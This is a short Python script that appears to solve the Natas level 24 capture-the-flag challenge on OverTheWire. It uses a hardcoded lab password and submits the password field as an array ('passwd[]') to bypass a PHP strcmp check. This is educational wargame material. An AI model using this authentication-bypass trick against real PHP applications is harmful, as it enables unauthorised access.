#!/bin/python
import requests,re

username = "natas24"
pwd = "OsRmXFguozKpTZZ5X14zNO43379LZveg"
url = f"http://{username}.natas.labs.overthewire.org/"
session = requests.Session()
data={'passwd[]':''}
res= session.post(url,data=data,auth=(username,pwd))
con=res.text
print(con)